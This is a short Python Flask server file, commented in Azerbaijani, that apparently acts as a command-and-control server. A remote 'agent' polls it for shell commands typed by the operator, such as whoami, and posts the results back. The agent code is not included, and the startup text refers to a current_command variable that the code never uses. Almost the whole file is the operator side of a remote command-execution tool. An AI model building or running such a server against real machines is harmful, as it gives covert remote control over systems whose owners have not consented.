# server.py
from flask import Flask, request, jsonify

app = Flask(__name__)

current_command = None
last_result = None

@app.route('/get_command', methods=['GET'])
def get_command():
    # Agent hər dəfə gələndə səndən terminalda əmr soruşacaq
    cmd = input("\n[>] Agent üçün əmr daxil et (məs: whoami): ")
    return jsonify({"command": cmd})

@app.route('/send_result', methods=['POST'])
def send_result():
    global last_result
    data = request.get_json()
    last_result = data.get("result")
    print("\n[Agentdən gələn nəticə]:\n", last_result)
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    print("Server işə salındı: [127.0.0.1](http://127.0.0.1:5000)")
    print("Əmr vermək üçün terminalda dəyişkəni qur:")
    print(">>> from server import current_command; current_command = 'dir'  (və ya ls)")
    app.run(host="127.0.0.1", port=5000)
